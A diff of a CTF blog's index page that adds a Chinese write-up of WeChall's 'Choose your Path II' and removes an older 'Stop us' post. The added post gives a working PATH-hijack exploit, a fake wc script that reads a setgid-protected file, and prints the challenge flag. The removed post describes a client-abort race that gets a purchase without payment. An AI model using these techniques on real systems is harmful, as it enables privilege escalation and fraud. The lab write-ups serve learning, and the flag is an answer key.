@@ -235,7 +235,7 @@ p.spoiler {
   <nav class="site-state">
       <div class="site-state-item site-state-posts">
         <a href="/archives/">
-          <span class="site-state-item-count">349</span>
+          <span class="site-state-item-count">350</span>
           <span class="site-state-item-name">posts</span>
         </a>
       </div>
@@ -246,7 +246,7 @@ p.spoiler {
       </div>
       <div class="site-state-item site-state-tags">
           <a href="/tags/">
-        <span class="site-state-item-count">212</span>
+        <span class="site-state-item-count">214</span>
         <span class="site-state-item-name">tags</span></a>
       </div>
   </nav>
@@ -376,6 +376,171 @@ p.spoiler {
     </div>
 
     <div class="main-inner index posts-expand">
+
+    
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
+    <link itemprop="mainEntityOfPage" href="https://vkkkv.github.io/wp/WeChall/wechall-choose-your-path-ii/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.png">
+      <meta itemprop="name" content="vkkkv">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Hello Navi">
+      <meta itemprop="description" content="A blog about CTF writeups, Linux, Mathematics, Technology, and personal thoughts.">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content=" | Hello Navi">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          <a href="/wp/WeChall/wechall-choose-your-path-ii/" class="post-title-link" itemprop="url">WeChall - Choose your Path II</a>
+        </h2>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">Posted on</span>
+      
+
+      <time title="Created: 2026-06-14 17:28:29 / Modified: 17:28:30" itemprop="dateCreated datePublished" datetime="2026-06-14T17:28:29+08:00">2026-06-14</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">In</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/ctf/" itemprop="url" rel="index"><span itemprop="name">ctf</span></a>
+        </span>
+    </span>
+
+  
+  
+  <span class="post-meta-item">
+    
+      <span class="post-meta-item-icon">
+        <i class="far fa-comment"></i>
+      </span>
+      <span class="post-meta-item-text">Disqus: </span>
+    
+    <a title="disqus" href="/wp/WeChall/wechall-choose-your-path-ii/#disqus_thread" itemprop="discussionUrl">
+      <span class="post-comments-count disqus-comment-count" data-disqus-identifier="wp/WeChall/wechall-choose-your-path-ii/" itemprop="commentCount"></span>
+    </a>
+  </span>
+  
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+          <h3 id="challenge">Challenge</h3>
+<blockquote>
+<p>This is the level11 mini challenge found in
+<code>/home/level/11_choose_your_path2/</code> on the warchall box.</p>
+</blockquote>
+<p>Choose your Path 续集。同样是一个 C 程序 <code>charp2</code>，用
+<code>popen()</code> 执行 <code>wc</code> 统计文件行数和字符数。</p>
+<p>与 level10 <code>charp</code> 的区别：</p>
+<table>
+<colgroup>
+<col style="width: 11%" />
+<col style="width: 29%" />
+<col style="width: 58%" />
+</colgroup>
+<thead>
+<tr>
+<th>特性</th>
+<th>charp (level10)</th>
+<th>charp2 (level11)</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>wc 路径</td>
+<td>硬编码 <code>/usr/bin/wc</code></td>
+<td>直接用 <code>wc</code>（依赖 PATH）</td>
+</tr>
+<tr>
+<td>参数包裹</td>
+<td>直接拼接</td>
+<td>单引号包裹 <code>'%s'</code></td>
+</tr>
+<tr>
+<td>引号转义</td>
+<td>无</td>
+<td><code>escape_single_quotes()</code> 将 <code>'</code> →
+<code>'\''</code></td>
+</tr>
+</tbody>
+</table>
+<p>Level 10 是靠 command injection（<code>popen()</code> 不处理 shell
+metachar），而 level 11 加上了单引号包裹和转义函数，所以 command
+injection 被堵了。</p>
+<p>但新的漏洞是：<strong><code>wc</code>
+没有指定绝对路径</strong>，可以通过 <code>PATH</code> 环境变量劫持。</p>
+<h3 id="solution">Solution</h3>
+<p><code>charp2</code> 是 setgid level11 的程序：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ ls -la /home/level/11_choose_your_path2/</span><br><span class="line">-rwxr-sr-x  1 level11 level11 16440 ... charp2      # setgid!</span><br><span class="line">-rw-r-----  1 root    level11   297 ... solution.txt  # 只有 level11 可读</span><br></pre></td></tr></table></figure>
+<p><code>solution.txt</code> 只允许 level11 group 读取，但
+<code>charp2</code> 执行时有效 GID 变成 level11，所以可以读取。</p>
+<p>攻击步骤：</p>
+<ol type="1">
+<li>创建一个 fake <code>wc</code> 脚本</li>
+<li>把它的目录加到 <code>PATH</code> 最前面</li>
+<li>运行 <code>charp2</code>，它通过 <code>popen("wc -l '...'")</code>
+执行时，会找到我们的 fake <code>wc</code></li>
+<li>fake <code>wc</code> 继承 <code>charp2</code> 的 setgid
+权限（<code>popen</code> → <code>/bin/sh -c</code> →
+<code>exec</code>，dash 不会丢弃 setgid），能读取
+<code>solution.txt</code></li>
+</ol>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 创建 fake wc</span></span><br><span class="line"><span class="built_in">mkdir</span> -p ~/mypayload</span><br><span class="line"><span class="built_in">cat</span> &gt; ~/mypayload/wc &lt;&lt; <span class="string">&#x27;EOF&#x27;</span></span><br><span class="line"><span class="comment">#!/bin/bash</span></span><br><span class="line"><span class="built_in">cat</span> /home/level/11_choose_your_path2/solution.txt 1&gt;&amp;2</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;1 5&quot;</span>  <span class="comment"># 让 charp2 能正常解析数字</span></span><br><span class="line">EOF</span><br><span class="line"><span class="built_in">chmod</span> +x ~/mypayload/wc</span><br><span class="line"></span><br><span class="line"><span class="comment"># 执行</span></span><br><span class="line"><span class="built_in">cd</span> /home/level/11_choose_your_path2</span><br><span class="line">PATH=~/mypayload:<span class="variable">$PATH</span> ./charp2 solution.txt</span><br></pre></td></tr></table></figure>
+<p>原理：</p>
+<ul>
+<li><code>popen("wc -l 'solution.txt'", "r")</code> →
+<code>/bin/sh -c "wc -l 'solution.txt'"</code></li>
+<li><code>/bin/sh</code> is <strong>dash</strong>（不是 bash），dash
+<em>不</em>会丢弃继承的 setgid</li>
+<li>dash 通过 PATH 找到我们的 <code>~/mypayload/wc</code>，执行时仍保有
+<code>charp2</code> 的 EGID=level11</li>
+<li>所以 fake <code>wc</code> 可以 <code>cat solution.txt</code></li>
+</ul>
+<span class="spoiler" onclick="this.classList.toggle('spoiler')"><span class="spoiler-blur ">CodingIsDamnHard3</span></span>
+
+      
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+</div>
+
+
+
 
     
 
@@ -1458,126 +1623,6 @@ token 生成，再用响应页面中的新 CSRF 推导同一种子下的 token�
 <p>若服务端 <code>pcre.backtrack_limit</code> 更高，等比例增大 padding
 即可。</p>
 <p>CSRF token 位于页面 form 中： <figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;gwf3_csrf&quot;</span> <span class="attr">value</span>=<span class="string">&quot;7zluZ476&quot;</span> /&gt;</span></span><br></pre></td></tr></table></figure></p>
-
-      
-    </div>
-
-    
-    
-    
-
-    <footer class="post-footer">
-        <div class="post-eof"></div>
-      
-    </footer>
-  </article>
-</div>
-
-
-
-
-    
-
-
-<div class="post-block">
-  
-  
-
-  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
-    <link itemprop="mainEntityOfPage" href="https://vkkkv.github.io/wp/WeChall/wechall-stop-us/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.png">
-      <meta itemprop="name" content="vkkkv">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Hello Navi">
-      <meta itemprop="description" content="A blog about CTF writeups, Linux, Mathematics, Technology, and personal thoughts.">
-    </span>
-
-    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
-      <meta itemprop="name" content=" | Hello Navi">
-      <meta itemprop="description" content="">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          <a href="/wp/WeChall/wechall-stop-us/" class="post-title-link" itemprop="url">WeChall - Stop us</a>
-        </h2>
-
-        <div class="post-meta-container">
-          <div class="post-meta">
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-calendar"></i>
-      </span>
-      <span class="post-meta-item-text">Posted on</span>
-      
-
-      <time title="Created: 2026-06-13 19:49:28 / Modified: 19:50:24" itemprop="dateCreated datePublished" datetime="2026-06-13T19:49:28+08:00">2026-06-13</time>
-    </span>
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-folder"></i>
-      </span>
-      <span class="post-meta-item-text">In</span>
-        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-          <a href="/categories/ctf/" itemprop="url" rel="index"><span itemprop="name">ctf</span></a>
-        </span>
-    </span>
-
-  
-  
-  <span class="post-meta-item">
-    
-      <span class="post-meta-item-icon">
-        <i class="far fa-comment"></i>
-      </span>
-      <span class="post-meta-item-text">Disqus: </span>
-    
-    <a title="disqus" href="/wp/WeChall/wechall-stop-us/#disqus_thread" itemprop="discussionUrl">
-      <span class="post-comments-count disqus-comment-count" data-disqus-identifier="wp/WeChall/wechall-stop-us/" itemprop="commentCount"></span>
-    </a>
-  </span>
-  
-  
-</div>
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-          <h3 id="challenge">Challenge</h3>
-<p>Noother 写了一个卖 <code>.xyz</code> domain 的 PHP
-小站。目标是找到漏洞，不花钱完成购买。</p>
-<h3 id="solution">Solution</h3>
-<p><code>purchaseDomain()</code> 和 <code>reduceMoney()</code> 之间有约
-6 秒间隙（三次 <code>nooth_message()</code> 各 sleep 2 秒）。PHP 默认
-<code>ignore_user_abort = false</code>，客户端断开连接后，PHP 在 sleep
-间隙检测到中止并终止脚本。利用这个窗口可以让
-<code>purchaseDomain()</code> 提交但 <code>reduceMoney()</code>
-被跳过。</p>
-<p><strong>利用步骤：</strong></p>
-<ol type="1">
-<li>加载余额：<code>?load=balance</code>（+$10，+1 funding）</li>
-<li>等 timeout 结束（45 秒 cooldown）</li>
-<li>发送购买请求，curl 设置 <code>--max-time 12</code>：请求约 12s
-后被切断，此时 <code>purchaseDomain()</code> 已执行（domains+1，money
-未扣）但 <code>reduceMoney()</code> 未执行</li>
-<li>再等一次 timeout
-结束，发一次<strong>正常购买</strong>（不切断）</li>
-<li>此时 fundings=1，domains=2，条件 <code>fundings &lt; domains</code>
-触发，自动解决</li>
-</ol>
-<p>关键源码逻辑：</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">noothtable::<span class="title function_ invoke__">purchaseDomain</span>(<span class="variable">$sid</span>);   <span class="comment">// domains=domains+1 WHERE money&gt;=price</span></span><br><span class="line"><span class="comment">// ~6s sleep via nooth_message()</span></span><br><span class="line">noothtable::<span class="title function_ invoke__">reduceMoney</span>(<span class="variable">$sid</span>, <span class="variable">$price</span>); <span class="comment">// money=money-price</span></span><br><span class="line"><span class="comment">// 随后检查 fundings &lt; domains</span></span><br></pre></td></tr></table></figure>
-<p>注意第二步必须是正常购买——如果第二次也切断，domains 只+1 但
-fundings=1，条件仍然 fundings &gt;= domains。只有
-<code>purchaseDomain</code> 成功两次而 <code>reduceMoney</code>
-只执行一次，才能制造差值。</p>
 
       
     </div>
